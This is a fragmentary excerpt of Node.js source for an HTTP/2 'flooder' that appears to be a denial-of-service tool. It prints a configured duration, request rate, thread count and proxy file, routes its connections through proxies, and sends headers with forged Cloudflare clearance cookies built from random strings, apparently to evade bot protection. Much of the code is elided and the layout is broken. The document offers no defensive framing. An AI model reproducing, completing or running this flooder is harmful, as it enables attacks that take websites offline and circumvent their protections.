...
if (cluster.isMaster) {
    ...
    console.log(` >> Duration     : `.brightYellow + args.time + " seconds");
    console.log(` >> Rate         : `.brightYellow + args.Rate + " req/s");
    console.log(` >> Threads      : `.brightYellow + args.threads);
    console.log(` >> Proxy File   : `.brightYellow + args.proxyFile);
    console.log("═════════════════════════════════════════════════════════════".gray);
...
class NetSocket {
    ...
    HTTP(options, callback) {
        try {
            ...
            connection.setTimeout(options.timeout * 1000); // timeout in ms
            ...
            connection.on("error", (error) => {
                ...
                connection.destroy();
                return callback(undefined, `error: proxy connection error ${error}`);
            });

        } catch (error) {
            console.error(`HTTP method error: ${error}`);
            return callback(undefined, `error: http method error ${error}`);
        }
    }
}
...
function runFlooder() {
    try {
        ...
        if (isNaN(proxyPort)) {
            console.error(`Invalid proxy port: ${parsedProxy[1]}`);
            return;
        }
 const nm = [
      "110.0.0.0",
...
let headers = {
  ...
  "TE": "trailers",
  "dnt" : "1",
  "cookie" : "cf_clearance=" + randstr(4) + "." + randstr(20) + "." + randstr(40) + "-0.0.1 " + randstr(20) + ";_ga=" + randstr(20) + ";_gid=" + randstr(15) + "__cf_chl_rt_tk" + randstr(20),
        ...
        Socker.HTTP(proxyOptions, (connection, error) => {
            ...
            try {
                ...
                client.on("error", error => {
                    console.error(`HTTP2 client error: ${error}`);
                    client.destroy();
                    connection.destroy();
                    return;
                });
                ...
                console.error(`Flooder error: ${error}`);
            }
        });
    } catch (error) {
        console.error(`Run flooder error: ${error}`);
    }
}
